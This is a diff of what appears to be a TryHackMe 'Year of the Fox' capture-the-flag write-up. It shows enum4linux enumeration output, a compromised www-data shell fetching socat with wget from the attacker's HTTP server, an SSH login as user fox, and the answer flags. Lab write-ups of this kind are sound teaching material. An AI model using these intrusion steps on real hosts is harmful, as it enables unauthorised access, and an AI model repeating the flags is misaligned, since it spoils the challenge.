@@ -327,12 +327,9 @@ Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
  ============================( Enumerating Workgroup/Domain on 10.10.249.21 )============================
 
-
 [+] Got domain/workgroup name: YEAROFTHEFOX
-
 
  ================================( Nbtstat Information for 10.10.249.21 )================================
 
@@ -349,9 +346,7 @@ Looking up status of 10.10.249.21
 
  ===================================( Session Check on 10.10.249.21 )===================================
 
-
 [+] Server 10.10.249.21 allows sessions using username '', password ''
-
 
  ================================( Getting domain SID for 10.10.249.21 )================================
 
@@ -360,19 +355,15 @@ Domain Sid: (NULL SID)
 
 [+] Can't determine if host is part of domain or part of a workgroup
 
-
  ===================================( OS information on 10.10.249.21 )===================================
 
-
 [E] Can't get OS info with smbclient
-
 
 [+] Got OS info for 10.10.249.21 from srvinfo: 
 	YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
 	platform_id     :	500
 	os version      :	6.1
 	server type     :	0x809a03
-
 
  =======================================( Users on 10.10.249.21 )=======================================
 
@@ -381,7 +372,6 @@ index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc:
 user:[fox] rid:[0x3e8]
 
  =================================( Share Enumeration on 10.10.249.21 )=================================
-
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -406,8 +396,6 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 //10.10.249.21/IPC$	Mapping: N/A Listing: N/A Writing: N/A
 
  ============================( Password Policy Information for 10.10.249.21 )============================
-
-
 
 [+] Attaching to 10.10.249.21 using a NULL share
 
@@ -438,38 +426,26 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 	[+] Account Lockout Threshold: None
 	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
 
-
-
 [+] Retieved partial password policy with rpcclient:
-
 
 Password Complexity: Disabled
 Minimum Password Length: 5
 
-
  =======================================( Groups on 10.10.249.21 )=======================================
-
 
 [+] Getting builtin groups:
 
-
 [+]  Getting builtin group memberships:
-
 
 [+]  Getting local groups:
 
-
 [+]  Getting local group memberships:
-
 
 [+]  Getting domain groups:
 
-
 [+]  Getting domain group memberships:
 
-
  ==================( Users on 10.10.249.21 via RID cycling (RIDS: 500-550,1000-1050) )==================
-
 
 [I] Found new SID: 
 S-1-22-1
@@ -511,7 +487,6 @@ S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
 
 No printers returned.
 
-
 enum4linux complete on Sat Mar 25 18:41:59 2023
 
 This site is asking you to sign in.
@@ -531,8 +506,6 @@ Accept-Encoding: gzip, deflate
 Connection: close
 
 Upgrade-Insecure-Requests: 1
-
-
 
 HTTP/1.1 401 Unauthorized
 
@@ -727,7 +700,6 @@ ls
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.10.249.21 - - [25/Mar/2023 20:32:39] "GET /socat HTTP/1.1" 200 -
 
-
 www-data@year-of-the-fox:/tmp$ wget http://10.8.19.103:1234/socat
 wget http://10.8.19.103:1234/socat
 --2023-03-26 00:32:40--  http://10.8.19.103:1234/socat
@@ -808,13 +780,11 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[10.10.249.21]:8888' (ED25519) to the list of known hosts.
 fox@10.10.249.21's password: 
 
-
 	__   __                       __   _   _            _____         
 	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
 	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
 	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
 	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\
-
 
                                                                   
 fox@year-of-the-fox:~$ ls
@@ -979,10 +949,6 @@ https://cyberchef.io/#recipe=Reverse('Character')From_Hex('Auto')ROT13(true,true
 
 ```
 
-
-![[Pasted image 20230325181741.png]]
-
-
 What is the **web** flag?  
 
 *THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}*
@@ -994,6 +960,5 @@ What is the **user** flag?
 What is the **root** flag?
 
 *THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}*
-
 
 [[PS Eclipse]]
